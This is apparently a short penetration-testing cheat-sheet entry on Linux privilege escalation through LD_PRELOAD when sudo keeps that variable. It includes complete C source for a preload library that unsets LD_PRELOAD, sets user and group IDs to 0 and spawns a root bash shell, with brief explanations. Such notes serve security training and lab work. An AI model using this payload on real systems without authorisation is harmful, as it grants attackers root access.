![image](https://user-images.githubusercontent.com/96658935/147622984-7193ceee-663b-4649-b16c-65016f201af4.png)


This means we can run a script before any other libraries. When you run sudo -l and see this output do the following:


```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

```
* save file as [x].c so it can be compiled.
* This code includes standard io,sys types, and standard libraries.
* Then it unsets the library preload which is LD_PRELOAD.
* Then set setgid and setuid to zero which is root.
* Then the system executes /bin/bash.



